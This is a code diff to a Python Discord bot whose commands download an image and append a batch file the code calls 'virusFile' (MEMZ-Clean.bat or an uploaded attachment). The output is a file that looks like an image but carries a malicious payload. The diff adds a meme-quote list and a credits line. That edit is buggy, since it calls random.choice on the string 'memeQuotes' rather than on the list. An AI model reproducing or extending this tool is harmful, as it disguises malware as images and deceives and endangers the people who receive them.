@@ -8,6 +8,9 @@ intents.members = True
 
 bot = commands.Bot(command_prefix='.', intents=intents)
 watermark = "  ____  _\n |  _ \(_)\n | |_) |_ _ __  _ __ ___   ___ _ __ __ _  ___\n |  _ <| | '_ \| '_ ` _ \ / _ \ '__/ _` |/ _ \ \n | |_) | | | | | | | | | |  __/ | | (_| |  __/\n |____/|_|_| |_|_| |_| |_|\___|_|  \__, |\___|\n                                    __/ |\n                                   |___/"
+memeQuotes = [
+    ""
+]
 
 @bot.event
 async def on_ready():
@@ -24,7 +27,7 @@ async def trigger(ctx):
     if ctx.channel.id == 863261299487014947:
         image = requests.get(ctx.message.attachments[0].url).content
         virusFile = open("MEMZ-Clean.bat", 'rb').read()
-        credits = bytes(f'\n\n{watermark}\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
+        credits = bytes(f'\n\n{watermark}{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
 
         with open("tempfile", "wb") as file:
             file.write(image + virusFile + credits)
@@ -41,7 +44,7 @@ async def merge(ctx, link):
     """Merge 2 given files"""
     image = requests.get(link).content
     virusFile = requests.get(ctx.message.attachments[0].url).content
-    credits = bytes("\n\n  ____  _\n |  _ \(_)\n | |_) |_ _ __  _ __ ___   ___ _ __ __ _  ___\n |  _ <| | '_ \| '_ ` _ \ / _ \ '__/ _` |/ _ \ \n | |_) | | | | | | | | | |  __/ | | (_| |  __/\n |____/|_|_| |_|_| |_| |_|\___|_|  \__, |\___|\n                                    __/ |\n                                   |___/\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029", 'utf-8')
+    credits = bytes(f'\n\n{watermark}{random.choice("memeQuotes")}\n\nCode and bot by: Roblox Thot#0001\nServer help by: red_muta#6029', 'utf-8')
 
     with open("tempfile", "wb") as file:
         file.write(image + virusFile + credits)
